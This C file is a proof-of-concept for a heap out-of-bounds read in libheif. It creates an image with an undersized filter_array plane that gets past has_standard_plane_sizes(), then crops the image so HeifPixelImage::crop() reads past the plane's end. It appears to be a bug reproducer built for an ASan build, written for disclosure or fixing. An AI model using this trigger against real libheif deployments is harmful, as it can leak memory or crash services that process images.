// PoC: public-API crop of an RGB image carrying an extra data plane
// (filter_array) whose height is smaller than the image height.
//
// has_standard_plane_sizes() is supposed to reject any plane whose geometry
// does not match the image. For the extra data channels it fails to constrain
// the plane height, so an under-sized filter_array plane passes the gate and
// HeifPixelImage::crop() then reads whole rows past the end of that plane.
//
// Build:
//   cc -I libheif/api pocs/newbug.c -o /tmp/newbug \
//      -L build-asan/libheif -lheif -Wl,-rpath,build-asan/libheif
// Run:
//   /tmp/newbug
#include <stdio.h>
#include <libheif/heif.h>

int main(void)
{
  const int W = 512, H = 512;

  struct heif_image* img = NULL;
  struct heif_error err =
      heif_image_create(W, H, heif_colorspace_RGB, heif_chroma_444, &img);
  if (err.code != heif_error_Ok) { fprintf(stderr, "create: %s\n", err.message); return 2; }

  err = heif_image_add_plane(img, heif_channel_R, W, H, 8);
  if (err.code != heif_error_Ok) { fprintf(stderr, "R: %s\n", err.message); return 2; }
  err = heif_image_add_plane(img, heif_channel_G, W, H, 8);
  if (err.code != heif_error_Ok) { fprintf(stderr, "G: %s\n", err.message); return 2; }
  err = heif_image_add_plane(img, heif_channel_B, W, H, 8);
  if (err.code != heif_error_Ok) { fprintf(stderr, "B: %s\n", err.message); return 2; }

  // Extra data plane deliberately only one row tall.
  err = heif_image_add_plane(img, heif_channel_filter_array, W, 1, 8);
  if (err.code != heif_error_Ok) { fprintf(stderr, "fa: %s\n", err.message); return 2; }

  // Crop one column off the right edge; keeps the full image height.
  err = heif_image_crop(img, 0, 1, 0, 0);
  printf("crop returned: code=%d %s\n", err.code, err.message ? err.message : "");

  heif_image_release(img);
  return 0;
}
